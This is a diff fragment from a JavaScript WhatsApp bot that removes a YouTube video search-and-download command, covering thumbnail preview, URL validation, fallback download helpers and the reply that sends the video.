-      // Search on YouTube
-      const { videos } = await yts(searchQuery);
-      if (!videos || videos.length === 0) {
-        await sock.sendMessage(chatId, { text: 'No videos found!' }, { quoted: message });
-        return;
-      }
-      videoUrl = videos[0].url;
-      videoTitle = videos[0].title;
-      videoThumbnail = videos[0].thumbnail;
-    }
-
-    // Show thumbnail immediately
-    try {
-      const ytIdMatch = videoUrl.match(/(?:youtu\.be\/|v=)([a-zA-Z0-9_-]{11})/);
-      const ytId = ytIdMatch ? ytIdMatch[1] : null;
-      const thumbUrl = videoThumbnail || (ytId ? `https://i.ytimg.com/vi/${ytId}/sddefault.jpg` : undefined);
-      const captionTitle = videoTitle || searchQuery;
-      if (thumbUrl) {
-        await sock.sendMessage(chatId, {
-          image: { url: thumbUrl },
-          caption: `*${captionTitle}*\nDownloading...`
-        }, { quoted: message });
-      }
-    } catch (e) {
-      console.error('[VIDEO] thumb error:', e?.message || e);
-    }
-
-    // Validate URL
-    const urlMatch = videoUrl.match(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch\?v=|v\/|embed\/|shorts\/|playlist\?list=)?)([a-zA-Z0-9_-]{11})/i);
-    if (!urlMatch) {
-      await sock.sendMessage(chatId, { text: 'This is not a valid YouTube link!' }, { quoted: message });
-      return;
-    }
-
-    // Try with Yupra first, fallback to Okatsu
-    let videoData;
-    try {
-      videoData = await getYupraVideoByUrl(videoUrl);
-    } catch (e1) {
-      videoData = await getOkatsuVideoByUrl(videoUrl);
-    }
-
-    // Send video
-    await sock.sendMessage(chatId, {
-      video: { url: videoData.download },
-      mimetype: 'video/mp4',
-      fileName: `${videoData.title || 'video'}.mp4`,
-      caption: `*${videoData.title || 'Video'}*\n\n> *_Downloaded by LADYBUG BOT_*`
-    }, { quoted: message });
-  } catch (error) {
-    console.error('[VIDEO] Command Error:', error?.message || error);
-    await sock.sendMessage(chatId, { text: 'Download failed: ' + (error?.message || 'Unknown error') }, { quoted: message });
-  }
-  break;
-}
               case 'winfo': {
                 if (!args[0]) {
                     await socket.sendMessage(sender, {
